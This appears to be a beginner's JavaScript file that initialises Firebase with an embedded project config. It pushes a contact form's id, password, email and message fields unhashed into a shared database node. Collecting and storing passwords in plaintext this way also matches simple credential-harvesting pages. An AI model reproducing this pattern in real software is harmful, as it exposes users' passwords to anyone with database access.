// Initialize Firebase
var config = {
  apiKey: "AIzaSyC_oWPLqxud6CVBc7nqDrfV8VIbrHeMBDY",
  authDomain: "my-awsome-project-41a9b.firebaseapp.com",
  databaseURL: "https://my-awsome-project-41a9b.firebaseio.com",
  projectId: "my-awsome-project-41a9b",
  storageBucket: "my-awsome-project-41a9b.appspot.com",
  messagingSenderId: "288087166760"
};
firebase.initializeApp(config);

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);
// Function to get get form values
function submitForm(e){
    e.preventDefault();
    // Get values
    var id = getInputVal('id');
    var password = getInputVal('password');
    var email = getInputVal('email');
    var message = getInputVal('message');
    saveMessage(id ,password , email, message);
    // Clear form
    document.getElementById('contactForm').reset();
}
// References the messages collection
var messagesRef = firebase.database().ref('messages');
// Save message to firebase
function saveMessage(id ,password , email, message){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      id: id,
      password:password,
      email:email,
      message:message
    });
  }
//getting values
function getInputVal(id){
  return document.getElementById(id).value;
}

//Show alert
document.querySelector('.alert').style.display = 'block';
// Hide alert after 3 seconds
setTimeout(function(){
    document.querySelector('.alert').style.display = 'none';
},3000);